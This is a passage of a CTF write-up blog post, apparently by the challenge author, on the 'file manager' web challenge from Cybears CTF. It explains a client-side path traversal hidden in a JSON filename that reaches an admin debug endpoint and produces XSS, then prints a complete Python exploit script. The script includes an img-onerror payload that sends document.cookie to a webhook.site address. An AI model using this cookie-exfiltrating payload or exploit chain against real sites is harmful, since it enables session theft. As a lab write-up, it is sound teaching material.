+</span></span><span class="line"><span class="cl"><span class="n">malicious_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">front_end_url</span><span class="si">}</span><span class="s2">/files/</span><span class="si">{</span><span class="n">file_id</span><span class="si">}</span><span class="s2">&#34;</span></span></span></code></pre></div></div>
+<p>That&rsquo;s it! The path traversal is <strong>inside the file content</strong>, not in the URL we report. When the bot visits:</p>
+<ol>
+<li>Frontend loads <code>/files/{file_id}</code> page</li>
+<li>Frontend fetches <code>/api/files/content/{file_id}</code></li>
+<li>Backend returns our JSON: <code>{&quot;filename&quot;: &quot;../../api/admin_debug?query=&lt;XSS&gt;&quot;, &quot;content&quot;: &quot;...&quot;}</code></li>
+<li>Frontend parses JSON and extracts <code>filename</code></li>
+<li>Frontend calls <code>updateVisits(&quot;../../api/admin_debug?query=&lt;XSS&gt;&quot;, content)</code></li>
+<li>This makes a request to <code>/api/files/../../api/admin_debug?query=&lt;XSS&gt;</code></li>
+<li>Path resolves to <code>/api/admin_debug?query=&lt;XSS&gt;</code></li>
+<li>API returns <code>{message: &quot;&lt;XSS&gt;&quot;}</code></li>
+<li>Frontend renders it with <code>dangerouslySetInnerHTML</code> → XSS executes!</li>
+</ol>
+<h3 id="step-3-the-full-exploit">Step 3: The Full Exploit</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BASE_URL</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1:5000&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">front_end_url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1:3000&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 1. Register and login</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/auth/register&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;attacker&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;password123&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/auth/login&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;attacker&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;password123&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. Create file with JSON containing malicious filename</span>
+</span></span><span class="line"><span class="cl"><span class="n">xss_payload</span> <span class="o">=</span> <span class="s2">&#34;&lt;img/src=&#39;a&#39;onerror=fetch?.(`https://webhook.site/YOUR-ID?q=$</span><span class="si">{document.cookie}</span><span class="s2">`)&gt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">malicious_path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;../../api/admin_debug?query=</span><span class="si">{</span><span class="n">xss_payload</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">malicious_json</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;filename&#34;</span><span class="p">:</span> <span class="n">malicious_path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;content&#34;</span><span class="p">:</span> <span class="s2">&#34;dummy&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/files&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="n">malicious_json</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">file_id</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 3. Report the file URL to the bot</span>
+</span></span><span class="line"><span class="cl"><span class="n">malicious_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">front_end_url</span><span class="si">}</span><span class="s2">/files/</span><span class="si">{</span><span class="n">file_id</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s1">/api/report&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">malicious_url</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 4. Check webhook for flag!</span></span></span></code></pre></div></div>
+<h3 id="and-by-that-u-get-the-flag">And by that u get the flag</h3>
+<p><strong>Cybears{CSPT_AND_XSS_LIKE_A_PRO!!!}</strong></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_file_manager/" data-title="Cybears ctf web/file manager" data-via="Benhibafodhil" data-hashtags="ctf,web security,cybears_ctf,my_challenges"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_file_manager/" data-title="Cybears ctf web/file manager"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_file_manager/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_file_manager/" data-title="Cybears ctf web/file manager"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_file_manager/" data-title="Cybears ctf web/file manager"><i data-svg-src="/blog/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_file_manager/" data-title="Cybears ctf web/file manager"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_file_manager/" data-title="Cybears ctf web/file manager" data-description=""><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fcybears_ctf_web_file_manager%2f&amp;text=Cybears%20ctf%20web%2ffile%20manager" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/blog/tags/ctf/">Ctf</a>,&nbsp;<a href="/blog/tags/web-security/">Web Security</a>,&nbsp;<a href="/blog/tags/cybears_ctf/">Cybears_ctf</a>,&nbsp;<a href="/blog/tags/my_challenges/">My_challenges</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/blog/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/blog/posts/cybears_ctf_web_ozymandias/" class="prev" rel="prev" title="Cybears ctf web/ozymandias"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Cybears ctf web/ozymandias</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/blog/" target="_blank">F0DH1L</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/blog/css/custom.css"><script src="/blog/lib/lazysizes/lazysizes.min.js"></script><script src="/blog/lib/clipboard/clipboard.min.js"></script><script src="/blog/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/blog/js/theme.min.js"></script></body>
+</html>
